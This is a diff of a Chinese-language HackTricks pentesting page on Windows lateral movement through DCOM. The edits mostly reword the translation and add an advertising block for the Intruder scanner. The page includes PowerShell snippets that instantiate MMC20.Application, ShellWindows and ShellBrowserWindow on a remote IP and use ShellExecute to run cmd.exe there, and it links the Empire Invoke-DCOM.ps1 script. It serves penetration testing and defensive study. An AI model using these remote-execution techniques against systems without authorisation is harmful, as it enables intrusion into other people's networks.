@@ -4,23 +4,31 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* 你在**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT收藏品The PEASS Family](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+找到最重要的漏洞，以便您可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
+
 ## MMC20.Application
 
-**DCOM**（分布式组件对象模型）对象由于能够通过网络与对象进行交互而变得**有趣**。微软在DCOM [这里](https://msdn.microsoft.com/en-us/library/cc226801.aspx) 和 COM [这里](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) 有一些很好的文档。您可以使用PowerShell找到一个可靠的DCOM应用程序列表，运行`Get-CimInstance Win32_DCOMApplication`。
+**DCOM**（分布式组件对象模型）对象由于能够通过网络与对象进行交互而变得**有趣**。Microsoft在DCOM [这里](https://msdn.microsoft.com/en-us/library/cc226801.aspx)和COM [这里](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx)有一些很好的文档。您可以使用PowerShell找到一个可靠的DCOM应用程序列表，运行`Get-CimInstance Win32_DCOMApplication`。
 
 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM对象允许您脚本化MMC插件操作的组件。在枚举此COM对象中的不同方法和属性时，我注意到在Document.ActiveView下有一个名为`ExecuteShellCommand`的方法。
 
 ![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)
 
-您可以在[这里](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)阅读有关该方法的更多信息。到目前为止，我们有一个可以通过网络访问并执行命令的DCOM应用程序。最后一步是利用这个DCOM应用程序和ExecuteShellCommand方法在远程主机上获得代码执行。
+您可以在[这里](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)阅读有关该方法的更多信息。到目前为止，我们有一个可以通过网络访问并执行命令的DCOM应用程序。最后一步是利用这个DCOM应用程序和ExecuteShellCommand方法在远程主机上获得代码执行的能力。
 
 幸运的是，作为管理员，您可以使用PowerShell远程与DCOM进行交互，只需使用“`[activator]::CreateInstance([type]::GetTypeFromProgID`”。您只需要提供一个DCOM ProgID和一个IP地址。然后，它将远程提供给您该COM对象的一个实例：
 
@@ -37,7 +45,7 @@
 ![](<../../.gitbook/assets/image (4) (1) (2).png>)
 
 您可以在[这里](https://twitter.com/tiraniddo/status/817532039771525120)阅读更多关于该线程的信息。\
-使用[@tiraniddo](https://twitter.com/tiraniddo)的[OleView .NET](https://github.com/tyranid/oleviewdotnet)可以查看没有显式LaunchPermission设置的其他对象，它具有出色的Python过滤器（以及其他功能）。在这种情况下，我们可以将过滤器缩小到所有没有显式Launch Permission的对象。这样做时，我注意到两个对象：`ShellBrowserWindow`和`ShellWindows`：
+使用[@tiraniddo](https://twitter.com/tiraniddo)的[OleView .NET](https://github.com/tyranid/oleviewdotnet)可以查看没有显式LaunchPermission设置的其他对象，它具有出色的Python过滤器（以及其他功能）。在这种情况下，我们可以将过滤器缩小到所有没有显式Launch Permission的对象。在这样做时，我注意到两个对象：`ShellBrowserWindow`和`ShellWindows`：
 
 ![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)
 
@@ -49,15 +57,14 @@
 
 ### ShellWindows
 
-首先探索的对象是[ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx)。由于此对象没有与之关联的[ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx)，我们可以使用[Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NET方法配对[Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx)方法，通过其AppID在远程主机上实例化对象。为此，我们需要获取ShellWindows对象的[CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx)，也可以使用OleView .NET完成：
+首先探索的对象是[ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx)。由于此对象没有与之关联的[ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx)，我们可以使用[Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NET方法配对[Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx)方法，通过其AppID在远程主机上实例化对象。为了做到这一点，我们需要获取ShellWindows对象的[CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx)，也可以使用OleView .NET来完成：
 
 ![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)
 
 如下所示，“Launch Permission”字段为空，表示没有设置显式权限。
 
 ![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)
-
-现在，我们有了CLSID，可以在远程目标上实例化对象：
+现在我们已经获得了CLSID，我们可以在远程目标上实例化该对象：
 ```powershell
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
 $obj = [System.Activator]::CreateInstance($com)
@@ -70,7 +77,7 @@ $item = $obj.Item()
 ```
 ![](https://enigma0x3.files.wordpress.com/2017/01/item\_instantiation.png?w=416\&h=465)
 
-掌握了Shell窗口的全部操作，我们现在可以访问所有预期的公开方法/属性。在浏览这些方法后，**`Document.Application.ShellExecute`** 引起了我的注意。请确保按照该方法的参数要求进行操作，这些要求在[这里](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx)有详细说明。
+掌握了Shell窗口后，我们现在可以访问所有预期的方法/属性。在浏览这些方法后，**`Document.Application.ShellExecute`** 引起了注意。请确保按照该方法的参数要求进行操作，这些要求在[这里](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx)有详细说明。
 ```powershell
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
 ```
@@ -80,9 +87,9 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 
 ### ShellBrowserWindow
 
-这个特定的对象在Windows 7上不存在，使得它在横向移动方面的使用比“ShellWindows”对象有些受限，我在Win7-Win10上对其进行了测试并取得了成功。
+这个特定的对象在Windows 7上不存在，因此它在横向移动方面的使用比“ShellWindows”对象有些受限，我在Win7-Win10上对其进行了测试并成功执行。
 
-根据我对该对象的枚举，它似乎有效地提供了与前一个对象相同的资源管理器窗口接口。要实例化这个对象，我们需要获取它的CLSID。与上面类似，我们可以使用OleView .NET：
+根据我对该对象的枚举，它似乎与前一个对象一样，有效地提供了对资源管理器窗口的接口。要实例化此对象，我们需要获取其CLSID。与上述相似，我们可以使用OleView .NET：
 
 ![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)
 
@@ -90,16 +97,16 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 
 ![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)
 
-有了CLSID，我们可以重复上一个对象上的步骤来实例化对象并调用相同的方法：
+有了CLSID，我们可以重复上一个对象上的步骤来实例化该对象并调用相同的方法：
 ```powershell
 $com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 
 $obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
 ```
-![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow_command_execution.png?w=690\&h=441)
+![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow\_command\_execution.png?w=690\&h=441)
 
-正如你所看到的，命令在远程目标上成功执行。
+正如你所见，命令在远程目标上成功执行。
 
 由于该对象直接与Windows shell进行交互，我们不需要调用“ShellWindows.Item”方法，就像之前的对象一样。
 
@@ -137,21 +144,28 @@ $Obj.DDEInitiate("cmd", "/c $Command")
 ```
 ## 工具
 
-Powershell脚本[**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1)可以轻松调用所有被注释的方法来在其他机器上执行代码。
+Powershell脚本[**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1)允许轻松调用所有已注释的方法来在其他机器上执行代码。
 
 ## 参考资料
 
-* 第一种方法来自[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)，更多信息请点击链接
-* 第二部分来自[https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)，更多信息请点击链接
+* 第一种方法来自[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)，更多信息请访问链接
+* 第二部分来自[https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)，更多信息请访问链接
+
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm\_campaign=hacktricks&utm\_source=referral" %}
+
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
